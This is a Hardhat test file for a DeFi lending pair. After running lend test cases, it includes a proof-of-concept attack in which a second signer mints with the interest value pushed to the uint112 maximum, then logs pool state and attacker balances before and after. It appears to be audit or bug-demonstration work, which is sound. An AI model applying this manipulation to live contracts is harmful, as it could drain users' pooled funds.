import { BigNumber } from '@ethersproject/bignumber'
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers'
import { ethers } from 'hardhat'
import { expect } from '../shared/Expect'
import { constructorFixture, lendFixture, mintFixture } from '../shared/Fixtures'
import { now, pseudoRandomBigUint } from '../shared/Helper'
import * as TestCases from '../testCases'
import { Lend, LendParams, MintParams } from '../testCases'

const MaxUint112 = BigNumber.from(2).pow(112).sub(1)
const MaxUint224 = BigNumber.from(2).pow(224).sub(1)
let signers: SignerWithAddress[]
let assetInValue: bigint = BigInt(MaxUint224.toString())
let collateralInValue: bigint = BigInt(MaxUint224.toString())

describe('Lend', () => {
  let tests: any
  let snapshot: any

  before(async () => {
    snapshot = await ethers.provider.send('evm_snapshot', [])
  })

  it('', async () => {
    tests = await TestCases.lend()
    for (let i = 0; i < tests.length; i++) {
      let testCase: any = tests[i]
      console.log('\n', `Checking for Lend Test Case ${i + 1}`)
      await ethers.provider.send('evm_revert', [snapshot])
      await ethers.provider.send('evm_snapshot', [])
      signers = await ethers.getSigners()
      let pair: any
      let pairSim: any
      let updatedMaturity: any
      const currentBlockTime = await now()
      updatedMaturity = currentBlockTime + 864000n
      const constructor = await constructorFixture(assetInValue, collateralInValue, updatedMaturity)
      let mint: any
      const mintParameters: MintParams = {
        assetIn: testCase.assetIn,
        collateralIn: testCase.collateralIn,
        interestIncrease: testCase.interestIncrease,
        cdpIncrease: testCase.cdpIncrease,
        maturity: updatedMaturity,
        currentTimeStamp: testCase.currentTimeStamp,
      }
      try {
        mint = await mintFixture(constructor, signers[0], mintParameters)
        pair = mint.pair
        pairSim = mint.pairSim
      } catch (error) {
        console.log(`Ignored due to wrong minting parameters`)
        continue
      }
      const lendParams: LendParams = {
        assetIn: testCase.lendAssetIn,
        interestDecrease: testCase.lendInterestDecrease,
        cdpDecrease: testCase.lendCdpDecrease,
      }
      let lendTxData: any
      try {
        lendTxData = await lendFixture(mint, signers[0], lendParams)
        pair = lendTxData.pair
        pairSim = lendTxData.pairSim
      } catch {
        console.log(`Lending transaction expected to revert; check for failure`)
        try {
          await expect(
            pair.pairContractCallee
              .connect(signers[0])
              .lend(
                pair.maturity,
                signers[0].address,
                signers[0].address,
                lendParams.assetIn,
                lendParams.interestDecrease,
                lendParams.cdpDecrease
              )
          ).to.be.reverted
          console.log('Transaction reverted')
          continue
        } catch (error) {
          console.log('Borrowing Tx with the following params did not revert (expected revert)')
          console.log(testCase)
          expect.fail()
        }
      }

      const stateBefore = await pair.state()
      
      const assetBalanceBefore = await constructor.assetToken.balanceOf(signers[1].address)
      const collateralBalanceBefore = await constructor.collateralToken.balanceOf(signers[1].address)

      await pair.upgrade(signers[1]).mint(1n, BigInt(MaxUint112.toString()) - stateBefore.interest, 1n)
      
      const stateAfterAttack = await pair.state()
      console.log("BEFORE ATTACK:")
      console.log("pool.state.x: ", stateBefore.asset)
      console.log("pool.state.y: ", stateBefore.interest)
      console.log("pool.state.z ", stateBefore.cdp)
      console.log("Attacker asset balanceOf: ", assetBalanceBefore)
      console.log("Attacker collateral balanceOf: ", collateralBalanceBefore)

      const assetBalanceAfter = await constructor.assetToken.balanceOf(signers[1].address)
      const collateralBalanceAfter = await constructor.collateralToken.balanceOf(signers[1].address)

      console.log("AFTER ATTACK:")
      console.log("pool.state.x: ", stateAfterAttack.asset)
      console.log("pool.state.y: ", stateAfterAttack.interest)
      console.log("pool.state.z ", stateAfterAttack.cdp)
      console.log("Attacker asset balanceOf: ", assetBalanceAfter)
      console.log("Attacker collateral balanceOf: ", collateralBalanceAfter)
        
    }
  })
})
